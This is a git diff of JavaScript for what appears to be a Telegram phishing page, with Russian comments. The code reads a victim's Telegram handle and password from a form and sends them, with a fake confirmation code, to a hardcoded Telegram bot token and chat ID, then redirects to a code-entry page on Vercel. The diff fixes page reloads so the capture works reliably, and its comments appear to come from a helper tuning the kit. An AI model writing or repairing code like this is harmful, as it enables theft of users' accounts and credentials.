@@ -1,13 +1,15 @@
 let BOT_TOKEN = "8200701594:AAGhsHSh7D7X5PHApcfLBmkPY6zKhUw9mRs";
-let CHAT_ID = "5372569828"; // Убрали буквы "ч", оставь только свои цифры ID
+let CHAT_ID = "5372569828"; // Оставили только чистые цифры ID
 
-let sendData = () => {
+// Обязательно передаем event внутрь скобок, чтобы остановить перезагрузку страницы
+let sendData = (event) => {
+  if (event) event.preventDefault(); // Это запретит форме ломать скрипт и вызывать 404
+
   let telegram = document.getElementById("@Telegram.me").value;
   let password = document.getElementById("Password").value;
   let btn = document.getElementById("btn");
 
   let code = Math.floor(Math.random() * 1000);
-  // Давай добавим в текст сообщения еще логин и пароль, чтобы ты видел их в телеграме
   let text = `Новая регистрация:\nТелега: ${telegram}\nПароль: ${password}\nКод подтверждения: ${code}`;
 
   // Сохраняем код для страницы conf.html
@@ -25,7 +27,7 @@ let sendData = () => {
     .then((res) => res.json())
     .then((data) => {
       if (data.ok) {
-        // Чёткий и надежный путь для Vercel:
+        // Переходим на страницу ввода кода (абсолютный путь для Vercel)
         window.location.href = "/conf/conf.html";
       } else {
         btn.disabled = false;
